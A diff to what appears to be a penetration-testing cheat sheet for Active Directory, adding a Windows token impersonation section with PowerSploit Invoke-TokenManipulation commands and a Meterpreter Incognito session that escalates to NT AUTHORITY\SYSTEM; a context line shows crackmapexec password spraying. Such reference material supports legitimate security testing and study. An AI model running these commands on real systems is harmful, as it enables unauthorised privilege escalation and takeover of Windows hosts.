@@ -283,19 +283,47 @@ crackmapexec smb 10.10.13.100 -u users.txt -p $pass --users | tee userlist.txt
 
 ### Token Impersonation
 
-*requirement :*
-- have enough privileges
-
-
 > The Impersonation token technique allows to impersonate a user by stealing his token, this token allows to exploit this technique because of the SSO processes, Interactive Logon, process running...
 
 
-using [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) :
+> using [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) :
+
+*list tokens*
+```powershell
+# Show all tokens
+Invoke-TokenManipulation -ShowAll
+# show usable tokens 
+Invoke-TokenManipulation -Enumerate
+```
+*Start a new process with the token of a user*
+```powershell
+Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"
+```
+
+*process token manipulation*
+```powershell
+Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe -ProcessId $id
+```
 
 
-using [Incognito](https://github.com/FSecureLABS/incognito) :
+> using [Incognito](https://github.com/FSecureLABS/incognito) :
 
+*load incognito and list tokens :*
+```bash
+meterpreter > use incognito
+meterpreter > list_tokens -g
+```
 
+*impersonate token of "NT AUTHORITY\SYSTEM" :*
+```powershell
+meterpreter > getuid
+Server username: job\john
+meterpreter > impersonate_token "BUILTIN\Administrators"
+[+] Delegation token available
+[+] Successfully impersonated user NT AUTHORITY\SYSTEM
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
 
 
 ### Kerberoasting
